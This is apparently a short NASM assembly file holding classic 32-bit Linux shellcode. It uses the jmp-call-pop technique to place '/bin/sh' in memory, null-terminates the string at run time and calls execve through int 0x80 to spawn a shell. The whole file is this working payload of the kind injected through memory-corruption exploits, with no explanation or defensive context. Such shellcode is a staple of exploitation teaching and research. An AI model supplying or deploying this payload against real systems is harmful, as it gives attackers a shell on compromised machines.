; vim: sw=8 sts=8 et

bits    32
        jmp     L1

L2:     pop     ebx
        xor     ecx, ecx
        mov     [ebx+7], cl
        mul     ecx
        mov     al, 11
        int     0x80

L1:     call    L2
        db      "/bin/sh0"
